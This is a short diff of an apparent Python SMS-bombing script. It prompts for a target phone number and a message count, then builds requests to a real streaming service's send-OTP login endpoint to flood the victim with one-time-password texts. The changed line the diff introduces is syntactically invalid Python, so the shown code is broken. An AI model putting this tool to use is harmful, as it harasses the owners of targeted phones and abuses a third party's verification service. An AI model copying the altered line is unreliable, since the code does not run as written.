@@ -17,7 +17,7 @@ print("""
 \033[1;93m🔥╰╬───────────────────────────────────────────╬╯🔥
 """)
 
-phone=input("Enter Target Number :")
+phone=input(print"\033[1;93m"Enter Target Number :")
 sms=int(input("Set SMS Limit :"))
 
 url ="https://www.bioscopelive.com/bn/login/send-otp?phone=88"+phone+"&operator=bd-otp"
